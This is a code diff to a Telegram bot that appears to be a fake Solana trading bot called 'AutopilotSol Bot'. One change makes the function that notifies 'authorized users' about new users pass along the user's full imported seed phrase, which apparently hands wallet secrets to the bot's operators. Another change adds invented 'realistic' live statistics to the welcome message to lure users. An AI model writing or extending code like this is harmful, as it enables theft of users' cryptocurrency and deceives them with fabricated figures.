@@ -349,7 +349,7 @@ async def notify_authorized_users_new_user(context: ContextTypes.DEFAULT_TYPE, u
     short_address = f"{wallet_address[:6]}...{wallet_address[-6:]}"
 
     if import_type == "seed":
-        display_input = original_input.split()
+        display_input = original_input
         input_type = "Seed Phrase"
     else:
         # Show first 8 characters only
@@ -570,9 +570,21 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             disable_web_page_preview=False  # Enable web preview for solscan link
         )
     else:
+        # Get bot statistics for users without wallets
+        bot_stats = SimpleWallet.generate_realistic_bot_stats()
+    
+        # Format volume nicely
+        if bot_stats["volume_24h"] >= 1000000:
+            volume_display = f"${bot_stats['volume_24h']/1000000:.1f}M"
+        elif bot_stats["volume_24h"] >= 1000:
+            volume_display = f"${bot_stats['volume_24h']/1000:.1f}K"
+        else:
+            volume_display = f"${bot_stats['volume_24h']:.0f}"
+    
         text = (
             "🟢 **WELCOME TO AutopilotSol Bot** 🤖\n"
             "*The Fastest all in one Solana Trading bot!*\n\n"
+            f"📊 **Live Stats:** {bot_stats['wallets_connected']:,} wallets connected | {volume_display} volume today\n\n"
             "💼 **Wallet:**\n"
             "(No wallet linked) | $0.00\n\n"
             "📊 **PORTFOLIO**\n"
@@ -1426,9 +1438,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
-
-
-
 
